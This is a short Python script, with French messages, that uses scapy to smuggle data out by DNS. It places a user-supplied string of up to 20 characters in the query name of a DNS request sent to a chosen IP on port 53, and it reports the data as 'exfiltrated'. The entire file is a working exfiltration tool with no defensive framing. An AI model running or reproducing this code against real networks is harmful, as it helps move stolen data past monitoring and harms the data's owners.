import sys
from scapy.all import *

def send_dns_exfiltration(target_ip, data):
    if len(data) > 20:
        raise ValueError("La chaîne à exfiltrer ne doit pas dépasser 20 caractères.")
    
    domain_name = f"{data}"
    query = DNSQR(qname=domain_name, qtype='A')

    packet = IP(dst=target_ip)/UDP(sport=RandShort(), dport=53)/DNS(rd=1, qd=query)

    send(packet)
    print(f"Données exfiltrées : {data} vers {target_ip}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python dns_exfiltration_send.py <target_ip> <data>")
        sys.exit(1)

    target_ip = sys.argv[1]
    data = sys.argv[2]
    send_dns_exfiltration(target_ip, data)
